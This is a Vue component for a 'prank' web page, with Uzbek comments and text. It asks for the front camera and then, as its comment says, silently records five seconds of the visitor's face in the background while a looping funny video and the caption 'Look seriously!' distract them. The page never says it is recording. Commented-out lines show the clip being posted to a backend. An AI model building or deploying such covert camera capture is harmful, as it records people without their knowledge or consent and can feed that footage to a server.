<script>
export default {
  data() {
    return {
      stream: null,
      mediaRecorder: null,
      recordedChunks: [],
      recording: false,
    }
  },

  async mounted() {
    await this.requestCamera()
  },

  methods: {
    async requestCamera() {
      try {
        this.stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user' },
          audio: false
        })

        // 🔴 Orqa fonda yozishni boshlaymiz
        this.startRecording()

      } catch (e) {
        alert('Kamera ruxsatisiz davom etib bo‘lmaydi 😢')
      }
    },

    startRecording() {
      this.recordedChunks = []
      this.mediaRecorder = new MediaRecorder(this.stream)

      this.mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) {
          this.recordedChunks.push(e.data)
        }
      }

      this.mediaRecorder.start()
      this.recording = true

      // ⏱ 5 soniyadan keyin to‘xtaydi
      setTimeout(() => {
        this.stopRecording()
      }, 5000)
    },

    stopRecording() {
      if (this.mediaRecorder && this.recording) {
        this.mediaRecorder.stop()
        this.recording = false

        const videoBlob = new Blob(this.recordedChunks, {
          type: 'video/webm'
        })

        alert(videoBlob)

        // 👉 shu joyda backendga yuborish mumkin
        // const formData = new FormData()
        // formData.append('video', videoBlob)
        // axios.post('/api/upload', formData)
      }
    }
  }
}
</script>

<template>
  <div class="prank-page">
    <!-- 😂 Kulgili video -->
    <video
        class="fun-video"
        autoplay
        loop
        muted
        playsinline
    >
      <source src="../assets/prank.mp4" type="video/mp4" />
    </video>

    <div class="overlay">
      <h1>😂 Jiddiy qarang!</h1>
    </div>
  </div>
</template>

<style>
.prank-page {
  position: relative;
  width: 100vw;
  height: 100vh;
  overflow: hidden;
  background: #000;
}

.fun-video {
  width: 100%;
  height: 100%;
  object-fit: cover;
}

.overlay {
  position: absolute;
  inset: 0;
  background: rgba(0,0,0,0.4);
  color: #fff;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  font-size: 24px;
  text-align: center;
}
</style>
